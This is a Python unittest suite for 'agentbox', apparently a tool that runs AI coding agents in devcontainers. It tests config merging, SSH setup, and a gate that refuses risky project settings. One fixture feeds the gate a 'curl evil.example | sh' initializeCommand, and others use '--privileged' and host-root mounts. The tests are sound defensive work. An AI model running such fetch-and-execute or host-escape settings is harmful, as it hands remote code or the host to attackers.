from __future__ import annotations

import argparse
import contextlib
import io
import json
import subprocess
import sys
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from agentbox import cli
from agentbox import config as cfg


class TestDeepMerge(unittest.TestCase):
    def test_scalar_override_wins(self) -> None:
        self.assertEqual(cfg.deep_merge({"a": 1}, {"a": 2}), {"a": 2})

    def test_nested_dicts_merge(self) -> None:
        base = {"features": {"node": {}, "sshd": {}}}
        override = {"features": {"node": {"version": "22"}}}
        self.assertEqual(
            cfg.deep_merge(base, override),
            {"features": {"node": {"version": "22"}, "sshd": {}}},
        )

    def test_lists_are_replaced_not_appended(self) -> None:
        self.assertEqual(cfg.deep_merge({"mounts": ["a"]}, {"mounts": ["b"]}), {"mounts": ["b"]})

    def test_base_is_not_mutated(self) -> None:
        base = {"containerEnv": {"A": "1"}}
        cfg.deep_merge(base, {"containerEnv": {"B": "2"}})
        self.assertEqual(base, {"containerEnv": {"A": "1"}})


class TestAlias(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        self.registry = self.root / "aliases"
        self.registry.mkdir()

    def _register(self, alias: str, workspace: Path) -> None:
        cfg.claim_alias(self.registry, alias, workspace)

    def _workspace(self, *parts: str) -> Path:
        workspace = self.root.joinpath(*parts)
        workspace.mkdir(parents=True)
        return workspace

    def test_plain_name(self) -> None:
        self.assertEqual(cfg.alias_for(Path("/tmp/my-repo")), "my-repo")

    def test_unsafe_characters_are_replaced(self) -> None:
        workspace = self._workspace("weird name!")
        self.assertEqual(cfg.alias_for(workspace), "weird-name")

    def test_workspace_target(self) -> None:
        self.assertEqual(cfg.workspace_target(Path("/tmp/my-repo")), "/workspaces/my-repo")

    def test_free_basename_is_used(self) -> None:
        workspace = self._workspace("work", "web")
        self.assertEqual(cfg.alias_for(workspace, self.registry), "web")

    def test_same_workspace_keeps_its_alias(self) -> None:
        workspace = self._workspace("work", "web")
        self._register("web", workspace)
        self.assertEqual(cfg.alias_for(workspace, self.registry), "web")

    def test_second_workspace_with_same_basename_gets_a_digest(self) -> None:
        first = self._workspace("work", "web")
        second = self._workspace("client", "web")
        self._register("web", first)
        alias = cfg.alias_for(second, self.registry)
        self.assertNotEqual(alias, "web")
        self.assertTrue(alias.startswith("web-"))
        self.assertEqual(len(alias), len("web-") + cfg.DIGEST_LENGTH)

    def test_digest_alias_is_stable_after_the_first_one_disappears(self) -> None:
        first = self._workspace("work", "web")
        second = self._workspace("client", "web")
        self._register("web", first)
        alias = cfg.alias_for(second, self.registry)
        self._register(alias, second)
        (self.registry / "web").unlink()
        self.assertEqual(cfg.alias_for(second, self.registry), alias)


class TestApplyAlias(unittest.TestCase):
    def test_home_volume_carries_the_alias(self) -> None:
        config = cfg.apply_alias(
            {"mounts": [f"source=agentbox-home-{cfg.BASENAME_PLACEHOLDER},target=/home/dev,type=volume"]},
            "web-abc123",
        )
        self.assertEqual(config["name"], "web-abc123")
        self.assertIn("agentbox-home-web-abc123", config["mounts"][0])

    def test_base_config_mounts_the_share_directory(self) -> None:
        config = cfg.base_config(Path("/opt/share"), "demo")
        self.assertEqual(config["postCreateCommand"], cfg.POST_CREATE)
        self.assertTrue(any("/opt/share" in mount for mount in config["mounts"]))


class TestResolveConfig(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        self.workspace = self.root / "project"
        (self.workspace / ".devcontainer").mkdir(parents=True)
        self.state = self.root / "state"
        self.share = self.root / "share"
        self.share.mkdir()

    def _write(self, relative: str, payload: dict) -> None:
        (self.workspace / relative).write_text(json.dumps(payload), encoding="utf-8")

    def test_base_config_is_materialised_when_project_has_none(self) -> None:
        result = cfg.resolve_config(self.workspace, self.state, self.share, "project")
        self.assertIsNotNone(result)
        config = json.loads(result.read_text(encoding="utf-8"))
        self.assertEqual(config["postCreateCommand"], cfg.POST_CREATE)
        self.assertTrue(
            any(f"target={cfg.SHARE_MOUNT_TARGET}" in mount for mount in config["mounts"])
        )
        self.assertEqual(config["name"], "project")

    def test_project_config_without_override_is_used_as_is(self) -> None:
        self._write(cfg.PROJECT_CONFIG, {"image": "debian:bookworm"})
        self.assertIsNone(
            cfg.resolve_config(self.workspace, self.state, self.share, "project")
        )

    def test_local_override_merges_over_project_config(self) -> None:
        self._write(cfg.PROJECT_CONFIG, {"image": "debian:bookworm", "features": {"node": {}}})
        self._write(cfg.LOCAL_OVERRIDE, {"features": {"node": {"version": "22"}}})
        result = cfg.resolve_config(self.workspace, self.state, self.share, "project")
        self.assertEqual(result, self.workspace / cfg.MERGED_IN_PROJECT)
        config = json.loads(result.read_text(encoding="utf-8"))
        self.assertEqual(config["image"], "debian:bookworm")
        self.assertEqual(config["features"], {"node": {"version": "22"}})

    def test_local_override_merges_over_base_config(self) -> None:
        self._write(cfg.LOCAL_OVERRIDE, {"containerEnv": {"AGENTBOX_AGENTS": "@openai/codex"}})
        result = cfg.resolve_config(self.workspace, self.state, self.share, "project")
        config = json.loads(result.read_text(encoding="utf-8"))
        self.assertEqual(config["containerEnv"]["AGENTBOX_AGENTS"], "@openai/codex")
        self.assertEqual(config["remoteUser"], "dev")


class TestSshConfigBlock(unittest.TestCase):
    def test_block_carries_alias_port_and_key(self) -> None:
        block = cfg.ssh_config_block("demo", 49153, Path("/keys/demo/id_ed25519"), "dev")
        self.assertIn("Host demo", block)
        self.assertIn("Port 49153", block)
        self.assertIn("IdentityFile /keys/demo/id_ed25519", block)
        self.assertIn("User dev", block)


class TestUpCommand(unittest.TestCase):
    def test_project_owned_config_keeps_the_lockfile(self) -> None:
        workspace = Path("/tmp/project")
        override = workspace / cfg.MERGED_IN_PROJECT
        self.assertNotIn("--no-lockfile", cli.up_command(workspace, override, False))

    def test_external_config_disables_the_lockfile(self) -> None:
        command = cli.up_command(Path("/tmp/project"), Path("/state/run/devcontainer.json"), False)
        self.assertIn("--no-lockfile", command)

    def test_rebuild_recreates_the_container(self) -> None:
        self.assertIn(
            "--remove-existing-container", cli.up_command(Path("/tmp/project"), None, True)
        )


class TestExecCommand(unittest.TestCase):
    def test_external_config_is_passed_to_exec(self) -> None:
        command = cli.exec_command(
            Path("/tmp/project"), Path("/state/run/devcontainer.json"), ["claude"]
        )
        self.assertIn("--override-config", command)
        self.assertEqual(command[-1], "claude")

    def test_project_owned_config_needs_no_override(self) -> None:
        command = cli.exec_command(Path("/tmp/project"), None, ["zsh"])
        self.assertNotIn("--override-config", command)


class TestBinaryPrecheck(unittest.TestCase):
    def test_all_present(self) -> None:
        with mock.patch.object(cli.shutil, "which", return_value="/usr/bin/thing"):
            self.assertEqual(cli.missing_binaries(("docker", "npx")), [])

    def test_missing_are_reported(self) -> None:
        with mock.patch.object(cli.shutil, "which", side_effect=[None, "/usr/bin/npx"]):
            self.assertEqual(cli.missing_binaries(("docker", "npx")), ["docker"])

    def test_require_exits_nonzero_when_missing(self) -> None:
        with mock.patch.object(cli.shutil, "which", return_value=None):
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(cli.require_binaries(("docker",)), 3)
        self.assertIn("docker", err.getvalue())


class TestSshInclude(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.home = Path(self._tmp.name)
        self.state = self.home / ".config" / "agentbox"
        self.config = self.home / ".ssh" / "config"

    def test_line_is_prepended_when_missing(self) -> None:
        self.config.parent.mkdir(parents=True)
        self.config.write_text("Host example\n  User someone\n", encoding="utf-8")
        self.assertEqual(cli.ensure_ssh_include(self.state, self.home), "added")
        lines = self.config.read_text(encoding="utf-8").splitlines()
        self.assertEqual(lines[0], cli.include_line(self.state))
        self.assertIn("Host example", lines)

    def test_missing_config_is_created_with_owner_only_permissions(self) -> None:
        self.assertEqual(cli.ensure_ssh_include(self.state, self.home), "added")
        self.assertEqual(self.config.read_text(encoding="utf-8").splitlines()[0], cli.include_line(self.state))
        self.assertEqual(self.config.stat().st_mode & 0o777, 0o600)

    def test_existing_line_is_left_alone(self) -> None:
        self.config.parent.mkdir(parents=True)
        self.config.write_text(f"{cli.include_line(self.state)}\n\nHost example\n", encoding="utf-8")
        before = self.config.read_text(encoding="utf-8")
        self.assertEqual(cli.ensure_ssh_include(self.state, self.home), "present")
        self.assertEqual(self.config.read_text(encoding="utf-8"), before)

    def test_unwritable_config_reports_failure(self) -> None:
        with mock.patch.object(cli.Path, "write_text", side_effect=OSError("read-only")):
            self.assertEqual(cli.ensure_ssh_include(self.state, self.home), "failed")


class TestEditorResolver(unittest.TestCase):
    def test_vscodium_wins_over_the_others(self) -> None:
        with mock.patch.object(cli.shutil, "which", side_effect=["/usr/bin/codium"]):
            self.assertEqual(cli.find_editor(), "/usr/bin/codium")

    def test_code_oss_is_the_last_resort(self) -> None:
        with mock.patch.object(cli.shutil, "which", side_effect=[None, None, "/usr/bin/code-oss"]):
            self.assertEqual(cli.find_editor(), "/usr/bin/code-oss")

    def test_no_editor_found(self) -> None:
        with mock.patch.object(cli.shutil, "which", return_value=None):
            self.assertIsNone(cli.find_editor())

    def test_symlinked_code_is_recognised_as_code_oss(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "code-oss").write_text("", encoding="utf-8")
            (root / "code").symlink_to(root / "code-oss")
            self.assertEqual(cli.editor_name(str(root / "code")), "code-oss")
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertEqual(cli.require_capable_editor(str(root / "code")), 5)
            self.assertIn(f"yay -S {cli.VSCODIUM_PACKAGE}", err.getvalue())

    def test_vscodium_is_accepted(self) -> None:
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(cli.require_capable_editor("/usr/bin/codium"), 0)
        self.assertEqual(err.getvalue(), "")

    def test_either_installed_resolver_counts(self) -> None:
        listed = subprocess.CompletedProcess([], 0, stdout="ms-vscode-remote.remote-ssh\n", stderr="")
        with mock.patch.object(cli.subprocess, "run", return_value=listed) as run:
            self.assertEqual(cli.ensure_resolver("/usr/bin/code"), 0)
        self.assertEqual(run.call_count, 1)

    def test_second_marketplace_is_tried_when_the_first_has_none(self) -> None:
        listed = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        missing = subprocess.CompletedProcess([], 1)
        installed = subprocess.CompletedProcess([], 0)
        with mock.patch.object(cli.subprocess, "run", side_effect=[listed, missing, installed]) as run:
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(cli.ensure_resolver("/usr/bin/code"), 0)
        self.assertIn(cli.RESOLVERS[1], run.call_args.args[0])

    def test_no_marketplace_serves_a_resolver(self) -> None:
        listed = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        missing = subprocess.CompletedProcess([], 1)
        with mock.patch.object(cli.subprocess, "run", side_effect=[listed, missing, missing]):
            with contextlib.redirect_stdout(io.StringIO()):
                with contextlib.redirect_stderr(io.StringIO()) as err:
                    self.assertEqual(cli.ensure_resolver("/usr/bin/code"), 4)
        for resolver in cli.RESOLVERS:
            self.assertIn(resolver, err.getvalue())


class TestRiskySettings(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.workspace = Path(self._tmp.name) / "project"
        (self.workspace / ".devcontainer").mkdir(parents=True)

    def _write(self, relative: str, payload: dict) -> None:
        (self.workspace / relative).write_text(json.dumps(payload), encoding="utf-8")

    def test_host_side_keys_are_flagged(self) -> None:
        for key in ("initializeCommand", "runArgs", "mounts", "privileged", "workspaceMount"):
            self.assertEqual(cfg.risky_settings({key: "anything"}), [key])

    def test_unknown_keys_are_flagged_because_the_list_is_a_whitelist(self) -> None:
        self.assertEqual(cfg.risky_settings({"dockerComposeFile": "compose.yml"}), ["dockerComposeFile"])
        self.assertEqual(cfg.risky_settings({"build": {"dockerfile": "Dockerfile"}}), ["build"])
        self.assertEqual(cfg.risky_settings({"somethingInventedTomorrow": 1}), ["somethingInventedTomorrow"])

    def test_nested_docker_features_are_flagged(self) -> None:
        config = {"features": {"ghcr.io/devcontainers/features/docker-in-docker:2": {}}}
        self.assertEqual(
            cfg.risky_settings(config),
            ["features:ghcr.io/devcontainers/features/docker-in-docker:2"],
        )

    def test_host_socket_feature_is_flagged(self) -> None:
        config = {"features": {"ghcr.io/devcontainers/features/docker-outside-of-docker:1": {}}}
        self.assertEqual(len(cfg.risky_settings(config)), 1)

    def test_an_ordinary_config_is_not_flagged(self) -> None:
        config = {
            "image": "debian:bookworm",
            "features": {"ghcr.io/devcontainers/features/node:1": {}},
            "containerEnv": {"A": "1"},
            "customizations": {"vscode": {"extensions": ["a.b"]}},
        }
        self.assertEqual(cfg.risky_settings(config), [])

    def test_hardening_adds_the_sysbox_runtime_once(self) -> None:
        once = cfg.harden({"image": "debian"})
        self.assertEqual(once["runArgs"], [f"--runtime={cfg.SYSBOX_RUNTIME}"])
        twice = cfg.harden(once)
        self.assertEqual(twice["runArgs"].count(f"--runtime={cfg.SYSBOX_RUNTIME}"), 1)

    def test_hardening_keeps_existing_run_args(self) -> None:
        hardened = cfg.harden({"runArgs": ["--add-host=a:1"]})
        self.assertIn("--add-host=a:1", hardened["runArgs"])

    def test_only_project_layers_are_inspected(self) -> None:
        self._write(cfg.PROJECT_CONFIG, {"image": "debian:bookworm"})
        self._write(cfg.LOCAL_OVERRIDE, {"runArgs": ["--privileged"]})
        layers = cfg.project_layers(self.workspace)
        self.assertEqual(cfg.risky_settings(layers), ["runArgs"])

    def test_digest_changes_with_the_content(self) -> None:
        first = cfg.config_digest({"runArgs": ["--privileged"]})
        second = cfg.config_digest({"runArgs": ["-v", "/:/host"]})
        self.assertNotEqual(first, second)
        self.assertEqual(first, cfg.config_digest({"runArgs": ["--privileged"]}))


class TestNestedDockerHardening(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.source = Path(self._tmp.name) / "devcontainer.json"
        self.source.write_text("{}", encoding="utf-8")

    def test_the_feature_is_never_claimed_to_be_hardened(self) -> None:
        config = {"features": {"ghcr.io/devcontainers/features/docker-in-docker:2": {}}}
        with mock.patch.object(cli, "sysbox_available", return_value=True):
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertIsNone(cli.harden_nested_docker(self.source, config))
        self.assertIn("--privileged", err.getvalue())
        self.assertIn("cannot be combined", err.getvalue())
        self.assertFalse((self.source.parent / cfg.HARDENED_CONFIG).exists())

    def test_without_sysbox_the_price_is_still_named(self) -> None:
        config = {"features": {"ghcr.io/devcontainers/features/docker-in-docker:2": {}}}
        with mock.patch.object(cli, "sysbox_available", return_value=False):
            with contextlib.redirect_stderr(io.StringIO()) as err:
                self.assertIsNone(cli.harden_nested_docker(self.source, config))
        self.assertIn("yay -S sysbox-ce-bin", err.getvalue())

    def test_a_feature_free_config_is_put_on_sysbox(self) -> None:
        with mock.patch.object(cli, "sysbox_available", return_value=True):
            with contextlib.redirect_stdout(io.StringIO()) as out:
                hardened = cli.harden_nested_docker(self.source, {"image": "debian"})
        self.assertIsNotNone(hardened)
        self.assertIn(cfg.SYSBOX_RUNTIME, out.getvalue())
        written = json.loads(hardened.read_text(encoding="utf-8"))
        self.assertEqual(written["runArgs"], [f"--runtime={cfg.SYSBOX_RUNTIME}"])

    def test_no_sysbox_means_no_rewrite(self) -> None:
        with mock.patch.object(cli, "sysbox_available", return_value=False):
            self.assertIsNone(cli.harden_nested_docker(self.source, {"image": "debian"}))
        self.assertFalse((self.source.parent / cfg.HARDENED_CONFIG).exists())


class TestBoxAgentSettings(unittest.TestCase):
    def test_the_seeded_settings_free_the_agent_but_ask_before_history(self) -> None:
        permissions = cfg.BOX_SETTINGS["permissions"]
        self.assertIn("Bash(*)", permissions["allow"])
        self.assertEqual(permissions["ask"], ["Bash(git commit*)", "Bash(git push*)"])

    def test_existing_permissions_are_never_overwritten(self) -> None:
        self.assertIn("if (current.permissions) { process.exit(0); }", cli.SEED_SETTINGS_SCRIPT)

    def test_what_post_create_wrote_survives_the_seeding(self) -> None:
        self.assertIn("{ ...current, ...seed }", cli.SEED_SETTINGS_SCRIPT)

    def test_an_unparseable_file_is_left_untouched(self) -> None:
        self.assertIn("catch (error) { process.exit(0); }", cli.SEED_SETTINGS_SCRIPT)

    def test_seeding_reports_what_the_box_did(self) -> None:
        for stdout, expected in (("seeded\n", "seeded"), ("", "kept")):
            done = subprocess.CompletedProcess([], 0, stdout=stdout, stderr="")
            with mock.patch.object(cli.subprocess, "run", return_value=done):
                self.assertEqual(cli.seed_agent_settings(Path("/tmp/project"), None), expected)

    def test_a_box_without_node_is_reported_not_passed_over(self) -> None:
        broke = subprocess.CompletedProcess([], 127, stdout="", stderr="node: not found")
        with mock.patch.object(cli.subprocess, "run", return_value=broke):
            self.assertEqual(cli.seed_agent_settings(Path("/tmp/project"), None), "failed")

    def test_the_scripts_exit_code_survives_the_cleanup(self) -> None:
        self.assertTrue(cli.SEED_SETTINGS_SCRIPT.endswith("; exit $status"))

    def test_the_settings_are_valid_json(self) -> None:
        self.assertEqual(json.loads(cfg.box_settings_json()), cfg.BOX_SETTINGS)


class TestTrustGate(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        self.workspace = self.root / "project"
        (self.workspace / ".devcontainer").mkdir(parents=True)
        self.state = self.root / "state"

    def _write(self, payload: dict) -> None:
        (self.workspace / cfg.PROJECT_CONFIG).write_text(json.dumps(payload), encoding="utf-8")

    def test_harmless_config_passes(self) -> None:
        self._write({"image": "debian:bookworm"})
        self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 0)

    def test_risky_config_is_refused(self) -> None:
        self._write({"initializeCommand": "curl evil.example | sh"})
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 6)
        self.assertIn("--trust-config", err.getvalue())

    def test_trusting_records_the_digest_and_passes(self) -> None:
        self._write({"runArgs": ["--privileged"]})
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", True), 0)
        self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 0)

    def test_changed_config_needs_trusting_again(self) -> None:
        self._write({"runArgs": ["--privileged"]})
        with contextlib.redirect_stdout(io.StringIO()):
            cli.guard_project_config(self.workspace, self.state, "demo", True)
        self._write({"runArgs": ["-v", "/:/host"]})
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 6)


class TestExtensionSync(unittest.TestCase):
    def test_declared_extensions_are_read_from_the_config(self) -> None:
        config = {"customizations": {"vscode": {"extensions": ["redhat.ansible", "ms-python.python"]}}}
        self.assertEqual(cfg.declared_extensions(config), ["redhat.ansible", "ms-python.python"])

    def test_config_without_customizations_declares_nothing(self) -> None:
        self.assertEqual(cfg.declared_extensions({"image": "debian"}), [])

    def test_already_installed_extensions_are_skipped(self) -> None:
        wanted = ["redhat.ansible", "ms-python.python"]
        installed = ["RedHat.Ansible"]
        missing = cli.missing_extensions(wanted, installed)
        self.assertEqual(missing, ["ms-python.python"])
        self.assertEqual(len(missing), 1)

    def test_install_arguments_repeat_the_flag(self) -> None:
        command = cli.install_arguments("/usr/bin/codium", "demo", ["a.b", "c.d"])
        self.assertEqual(command[:3], ["/usr/bin/codium", "--remote", "ssh-remote+demo"])
        self.assertEqual(command.count("--install-extension"), 2)

    def test_nothing_wanted_means_no_subprocess(self) -> None:
        with mock.patch.object(cli.subprocess, "run") as run:
            self.assertEqual(cli.sync_extensions("/usr/bin/codium", "demo", []), 0)
        run.assert_not_called()

    def test_only_the_missing_ones_are_installed(self) -> None:
        listed = subprocess.CompletedProcess([], 0, stdout="redhat.ansible\n", stderr="")
        installed = subprocess.CompletedProcess([], 0)
        with mock.patch.object(cli.subprocess, "run", side_effect=[listed, installed]) as run:
            with contextlib.redirect_stdout(io.StringIO()):
                count = cli.sync_extensions("/usr/bin/codium", "demo", ["redhat.ansible", "ms-python.python"])
        self.assertEqual(count, 1)
        self.assertIn("ms-python.python", run.call_args.args[0])
        self.assertNotIn("redhat.ansible", run.call_args.args[0])


class TestEditorSettingsLink(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.home = Path(self._tmp.name)
        self.vscodium = self.home / ".config" / "VSCodium" / "User"
        self.oss = self.home / ".config" / "Code - OSS" / "User"

    def test_existing_code_oss_settings_become_the_source(self) -> None:
        self.oss.mkdir(parents=True)
        (self.oss / "settings.json").write_text("{}", encoding="utf-8")
        self.assertEqual(cli.link_editor_settings(self.home), "linked")
        self.assertTrue(self.vscodium.is_symlink())
        self.assertTrue((self.vscodium / "settings.json").exists())

    def test_existing_vscodium_settings_become_the_source(self) -> None:
        self.vscodium.mkdir(parents=True)
        self.assertEqual(cli.link_editor_settings(self.home), "linked")
        self.assertTrue(self.oss.is_symlink())

    def test_two_real_directories_are_left_alone(self) -> None:
        self.vscodium.mkdir(parents=True)
        self.oss.mkdir(parents=True)
        self.assertEqual(cli.link_editor_settings(self.home), "conflict")
        self.assertFalse(self.vscodium.is_symlink())
        self.assertFalse(self.oss.is_symlink())

    def test_nothing_to_link(self) -> None:
        self.assertEqual(cli.link_editor_settings(self.home), "nothing")

    def test_existing_link_is_kept(self) -> None:
        self.oss.mkdir(parents=True)
        self.vscodium.parent.mkdir(parents=True)
        self.vscodium.symlink_to(self.oss)
        self.assertEqual(cli.link_editor_settings(self.home), "present")


class TestApplyOverride(unittest.TestCase):
    def test_own_mounts_survive_a_mounts_override(self) -> None:
        base = {"mounts": ["source=agentbox-home-a,target=/home/dev,type=volume"]}
        override = {"mounts": ["source=/host/repoB,target=/workspaces/repoB,type=bind,readonly"]}
        self.assertEqual(
            cfg.apply_override(base, override)["mounts"],
            [
                "source=agentbox-home-a,target=/home/dev,type=volume",
                "source=/host/repoB,target=/workspaces/repoB,type=bind,readonly",
            ],
        )

    def test_a_repeated_mount_is_not_duplicated(self) -> None:
        mount = "source=agentbox-home-a,target=/home/dev,type=volume"
        self.assertEqual(cfg.apply_override({"mounts": [mount]}, {"mounts": [mount]})["mounts"], [mount])

    def test_other_keys_still_deep_merge(self) -> None:
        base = {"features": {"node": {}}, "name": "a"}
        override = {"features": {"python": {}}, "name": "b"}
        merged = cfg.apply_override(base, override)
        self.assertEqual(merged, {"features": {"node": {}, "python": {}}, "name": "b"})


class TestWorkspaceFile(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.workspace = Path(self._tmp.name)

    def write(self, name: str) -> Path:
        target = self.workspace / name
        target.write_text("{}", encoding="utf-8")
        return target

    def test_single_file_is_opened(self) -> None:
        target = self.write("custom.code-workspace")
        self.assertEqual(cfg.resolve_workspace_file(self.workspace), target)

    def test_no_file_opens_the_folder(self) -> None:
        self.assertIsNone(cfg.resolve_workspace_file(self.workspace))

    def test_local_wins_over_default(self) -> None:
        self.write(cfg.DEFAULT_WORKSPACE)
        local = self.write(cfg.LOCAL_WORKSPACE)
        self.assertEqual(cfg.resolve_workspace_file(self.workspace), local)

    def test_default_is_the_fallback(self) -> None:
        default = self.write(cfg.DEFAULT_WORKSPACE)
        self.write("custom.code-workspace")
        self.assertEqual(cfg.resolve_workspace_file(self.workspace), default)

    def test_several_files_without_a_default_open_the_folder(self) -> None:
        self.write("one.code-workspace")
        self.write("two.code-workspace")
        self.assertIsNone(cfg.resolve_workspace_file(self.workspace))

    def test_named_file_without_the_suffix(self) -> None:
        target = self.write("custom.code-workspace")
        self.assertEqual(cfg.resolve_workspace_file(self.workspace, "custom"), target)
        self.assertEqual(
            cfg.resolve_workspace_file(self.workspace, "custom.code-workspace"), target
        )

    def test_missing_named_file_lists_what_is_there(self) -> None:
        self.write("other.code-workspace")
        with self.assertRaises(LookupError) as raised:
            cfg.resolve_workspace_file(self.workspace, "custom")
        self.assertIn("custom.code-workspace", str(raised.exception))
        self.assertIn("other.code-workspace", str(raised.exception))

    def test_seed_writes_local_and_default_with_a_relative_folder(self) -> None:
        written = cfg.seed_workspace_files(self.workspace)
        self.assertEqual(
            written,
            [self.workspace / cfg.LOCAL_WORKSPACE, self.workspace / cfg.DEFAULT_WORKSPACE],
        )
        for target in written:
            self.assertEqual(
                json.loads(target.read_text(encoding="utf-8")),
                {"folders": [{"path": "."}], "settings": {}},
            )

    def test_seed_keeps_existing_files_and_completes_the_pair(self) -> None:
        self.write(cfg.DEFAULT_WORKSPACE)
        self.assertEqual(
            cfg.seed_workspace_files(self.workspace), [self.workspace / cfg.LOCAL_WORKSPACE]
        )
        self.assertEqual(cfg.seed_workspace_files(self.workspace), [])


class TestSkillInstall(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.workspace = Path(self._tmp.name) / "project"
        self.workspace.mkdir()
        self.script = cfg.POST_CREATE_SCRIPT.read_text(encoding="utf-8")

    def test_every_box_gets_the_skill_collection_by_default(self) -> None:
        base = json.loads(cfg.BASE_CONFIG.read_text(encoding="utf-8"))
        self.assertEqual(
            base["containerEnv"]["AGENTBOX_SKILLS"],
            "https://github.com/kevinveenbirkenbach/skills",
        )

    def test_post_create_installs_every_listed_repository(self) -> None:
        self.assertIn("${AGENTBOX_SKILLS:-}", self.script)
        self.assertIn('TARGET="$HOME" bash "$checkout/scripts/install.sh"', self.script)

    def test_an_unreachable_repository_does_not_fail_the_build(self) -> None:
        self.assertIn("were not installed — the box is up without them", self.script)

    def test_the_default_agents_cover_claude_codex_gemini_and_pi(self) -> None:
        base = json.loads(cfg.BASE_CONFIG.read_text(encoding="utf-8"))
        self.assertEqual(
            base["containerEnv"]["AGENTBOX_AGENTS"].split(),
            [
                "@anthropic-ai/claude-code",
                "@openai/codex",
                "@google/gemini-cli",
                "@earendil-works/pi-coding-agent",
            ],
        )

    def test_pi_is_installed_with_bun_because_its_shebang_demands_it(self) -> None:
        base = json.loads(cfg.BASE_CONFIG.read_text(encoding="utf-8"))
        self.assertEqual(
            base["containerEnv"]["AGENTBOX_BUN_AGENTS"], "@oh-my-pi/pi-coding-agent"
        )
        self.assertIn("${AGENTBOX_BUN_AGENTS:-}", self.script)
        self.assertIn('"$BUN_INSTALL/bin/bun" install -g "${bun_agents[@]}"', self.script)

    def test_bun_lands_where_the_box_already_looks_for_binaries(self) -> None:
        self.assertIn('export BUN_INSTALL="$HOME/.local"', self.script)

    def test_a_box_without_bun_agents_never_downloads_bun(self) -> None:
        self.assertIn('if [ "${#bun_agents[@]}" -gt 0 ]; then', self.script)

    def test_an_existing_bun_is_not_downloaded_again(self) -> None:
        self.assertIn('if [ ! -x "$BUN_INSTALL/bin/bun" ]; then', self.script)

    def test_update_refreshes_the_bun_agents_too(self) -> None:
        self.assertIn("AGENTBOX_BUN_AGENTS", cfg.PROVISIONING_ENV)

    def test_agents_are_still_required(self) -> None:
        self.assertIn("${AGENTBOX_AGENTS:?", self.script)

    def test_init_gives_the_project_its_own_copy_of_the_script(self) -> None:
        args = argparse.Namespace(workspace=self.workspace, force=False)
        with contextlib.redirect_stdout(io.StringIO()):
            with mock.patch.object(cli, "state_dir", return_value=self.workspace / "state"):
                self.assertEqual(cli.cmd_init(args), 0)

        config = json.loads((self.workspace / cfg.PROJECT_CONFIG).read_text(encoding="utf-8"))
        self.assertEqual(config["postCreateCommand"], cfg.PROJECT_POST_CREATE_COMMAND)
        self.assertIn("AGENTBOX_SKILLS", config["containerEnv"])
        copied = self.workspace / cfg.PROJECT_POST_CREATE
        self.assertEqual(copied.read_text(encoding="utf-8"), self.script)

    def test_an_edited_project_script_is_not_overwritten_without_force(self) -> None:
        (self.workspace / ".devcontainer").mkdir()
        (self.workspace / cfg.PROJECT_POST_CREATE).write_text("mine\n", encoding="utf-8")
        args = argparse.Namespace(workspace=self.workspace, force=False)
        captured = io.StringIO()
        with contextlib.redirect_stdout(captured), contextlib.redirect_stderr(captured):
            self.assertEqual(cli.cmd_init(args), 1)
        self.assertEqual(
            (self.workspace / cfg.PROJECT_POST_CREATE).read_text(encoding="utf-8"), "mine\n"
        )
        self.assertFalse((self.workspace / cfg.PROJECT_CONFIG).exists())
        self.assertIn("--force", captured.getvalue())


class TestUpdate(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        self.workspace = self.root / "project"
        (self.workspace / ".devcontainer").mkdir(parents=True)

    def _write(self, relative: str, payload: str = "{}") -> None:
        (self.workspace / relative).write_text(payload, encoding="utf-8")

    def _update(self) -> tuple[int, list[str], str]:
        captured = io.StringIO()
        done = subprocess.CompletedProcess([], 0)
        args = argparse.Namespace(workspace=self.workspace)
        with contextlib.redirect_stdout(captured), contextlib.redirect_stderr(captured):
            with mock.patch.object(cli, "missing_binaries", return_value=[]):
                with mock.patch.object(cli, "state_dir", return_value=self.root / "state"):
                    with mock.patch.object(cli.subprocess, "run", return_value=done) as run:
                        code = cli.cmd_update(args)
        called = run.call_args[0][0] if run.call_args else []
        return code, called, captured.getvalue()

    def test_a_box_on_the_base_config_runs_the_mounted_script(self) -> None:
        self.assertEqual(cfg.post_create_command(self.workspace), cfg.POST_CREATE)

    def test_a_project_runs_its_own_copy(self) -> None:
        self._write(cfg.PROJECT_CONFIG)
